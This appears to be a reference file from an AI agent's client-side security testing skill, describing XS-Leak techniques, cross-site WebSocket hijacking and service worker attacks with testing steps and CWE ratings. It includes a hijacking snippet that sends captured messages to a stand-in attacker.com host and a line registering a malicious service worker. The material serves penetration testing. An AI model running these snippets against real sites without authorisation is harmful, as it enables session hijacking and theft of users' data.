# Browser API & Side-Channel Testing

> Referenced from [client-side-security SKILL.md](../SKILL.md) — detailed testing procedures for XS-Leaks, WebSocket hijacking, and service worker attacks. Load when the target uses WebSockets, registers service workers, or when you need cross-origin side-channel techniques.

## Table of Contents

- [Cross-Site Leaks (XS-Leaks)](#cross-site-leaks-xs-leaks)
- [WebSocket Security](#websocket-security)
- [Service Worker Attacks](#service-worker-attacks)

---

## Cross-Site Leaks (XS-Leaks)

Side-channel techniques that infer cross-origin state without directly reading the response. Useful for user deanonymization, login detection, and content oracle attacks.

### Techniques

| Technique | What It Leaks | How |
|-----------|--------------|-----|
| **Frame counting** | Page state differences | `window.open(url).frames.length` differs based on auth state |
| **Timing attacks** | Content size/complexity | Measure `fetch()` or `<img>` load time; authenticated pages load differently |
| **Error events** | Resource existence | `<script src="target/api">` fires `onerror` vs `onload` based on response type |
| **Cache probing** | Prior visits/auth state | Load resource, measure timing; cached = previously visited |
| **History length** | Navigation state | `history.length` changes if redirect occurred (login vs. not) |
| **Content-Type oracle** | Response type | `<script>` tag errors reveal if response is JSON vs HTML |
| **ETag length leak** | Response body size | Cross-origin ETag value changes at hex digit boundaries (e.g., 0xFF to 0x100) — byte-level size inference without reading response. PortSwigger Top 10 2025 #6 |
| **Connection pool exhaustion** | Cross-origin redirect target | Chrome prioritizes in-flight requests sharing a connection pool — measure `fetch()` timing to detect whether cross-origin redirect went to site A vs B. PortSwigger Top 10 2025 #8 |

### Testing Procedure

1. **Identify state-dependent endpoints** — Pages that behave differently for logged-in vs. logged-out users, or for user A vs. user B
2. **Test frame counting** — Open target in popup, check `popup.frames.length` from attacker page. Different values = information leak
3. **Test timing side-channels** — Measure request duration for search endpoints: `?q=known_user` vs `?q=nonexistent` — timing difference reveals user existence
4. **Test error-based oracles** — Load cross-origin resources as `<script>`, `<img>`, `<link>`. Error/success differences leak state
5. **Check SameSite cookie policy** — If cookies are `SameSite=None`, most XS-Leak techniques work. `SameSite=Lax` blocks many but not top-level navigation-based leaks

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-203 | Medium-High | User deanonymization is Medium; account existence oracle enabling targeted attack is High |

---

## WebSocket Security

WebSockets maintain persistent bidirectional connections and often skip standard browser security controls.

### Cross-Site WebSocket Hijacking (CSWSH)

WebSocket handshakes are regular HTTP upgrades — browsers attach cookies automatically. If the server doesn't validate `Origin`, an attacker page can hijack the connection.

### Testing Procedure

1. **Check handshake** — Inspect the `Upgrade` request. Does the server validate the `Origin` header? Send `Origin: https://evil.com` in the handshake
2. **Check auth mechanism** — Is auth via cookies only (vulnerable to CSWSH), or does it require a token in the first WS message?
3. **Test CSWSH** — From attacker page:
   ```javascript
   var ws = new WebSocket('wss://target.com/ws');
   ws.onmessage = (e) => fetch('https://attacker.com/log?d='+e.data);
   ```
   If the connection succeeds with the victim's session, CSWSH is confirmed
4. **Check for sensitive data in URL** — `wss://target.com/ws?token=SECRET` leaks token in logs, Referer headers
5. **Test message injection** — Send unexpected message types. Does the server validate message structure/commands?

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-1385, CWE-346 | High | CSWSH leading to data exfil or actions-on-behalf is High-Critical |

---

## Service Worker Attacks

Service workers intercept all network requests within their scope. A registered malicious SW persists across page reloads and can poison responses indefinitely.

### Testing Procedure

1. **Find SW registration points** — Search JS for `navigator.serviceWorker.register()`. Note the `scope` parameter
2. **Check scope restrictions** — SW scope is limited to its directory path. A SW at `/static/sw.js` can only control `/static/*` unless `Service-Worker-Allowed` header broadens it
3. **Test SW registration via injection** — If you can inject HTML/JS at a path, try registering an attacker-controlled SW:
   ```javascript
   navigator.serviceWorker.register('/user-upload/evil-sw.js', {scope: '/'})
   ```
4. **Cache poisoning via SW** — If a legitimate SW caches responses without integrity checks, poison the cache by MITM during install phase or via server-side cache poisoning
5. **Check for SW update bypass** — SWs update when the byte content changes. If the SW URL is cacheable by a CDN, stale cached SW prevents security updates

### Key Indicators

- User-uploadable paths that share origin with the main app
- SW scope broader than necessary (`/` scope for a SW that only needs `/app/`)
- Missing `Service-Worker-Allowed` restrictions
- SW caching API responses containing auth tokens

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-349 | Medium-High | Persistent interception of all requests in scope; session hijacking if tokens are cached |
